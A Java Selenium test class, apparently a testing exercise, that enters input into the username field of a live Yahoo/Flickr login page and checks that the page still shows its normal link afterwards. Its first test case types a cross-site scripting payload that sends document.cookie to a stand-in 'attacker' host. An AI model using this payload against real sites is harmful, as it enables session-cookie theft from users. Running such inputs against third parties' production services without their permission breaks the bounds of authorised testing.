package Home_Page;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.By;
import static org.junit.Assert.assertTrue;



public class xssAttack {
    private static WebDriver driver = null;

    public static void main(String[] args) throws InterruptedException {

        driver = new ChromeDriver ();

        //driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);

        driver.get("https://login.yahoo.com/?done=https%3A%2F%2Fapi.login.yahoo.com%2Foauth2%2Frequest_auth%3Fclient_id%3Ddj0yJmk9NTJmMkVmOFo3RUVmJmQ9WVdrOVdXeGhVMWx3TjJFbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD01OA--%26redirect_uri%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsignin%252Fyahoo%252Foauth%252F%253Fredir%253Dhttps%25253A%25252F%25252Fwww.flickr.com%25252F%26response_type%3Dcode%26scope%3Dopenid%252Csdpp-w%26nonce%3D99b5299ebcce0c287922a3a8f870e9a4%26.scrumb%3D0&crumb=FCJ8DECJNnW&redirect_uri=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2Foauth%2F%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252F");

        //TC01
        Home_Page.txtbx_UserName(driver).sendKeys("<script>\n" +
                "window.location='http://attacker/?cookie='+document.cookie\n" +
                "</script>");
        Home_Page.Submit_Btn(driver).click();
        Thread.sleep ( 5000 );
        String actualString = driver.findElement(By.xpath("//*[@id='mbr-forgot-link']")).getText();

        String expectedString = "Αντιμετωπίζετε πρόβλημα με τη σύνδεση;";

        assertTrue(actualString.contains(expectedString));

        //TC02
        Home_Page.txtbx_UserName(driver).clear ();
        Home_Page.txtbx_UserName(driver).sendKeys("print \"<html>\"\n" +
                "print \"Latest comment:\"\n" +
               "print database.latestComment\n" +
                "print \"</html>\"");
        Home_Page.Submit_Btn(driver).click();
        Thread.sleep ( 5000 );
        String actualString2 = driver.findElement(By.xpath("//*[@id='mbr-forgot-link']")).getText();
        String expectedString2 = "Αντιμετωπίζετε πρόβλημα με τη σύνδεση;";
        assertTrue(actualString2.contains(expectedString2));
        driver.quit();

    }
}
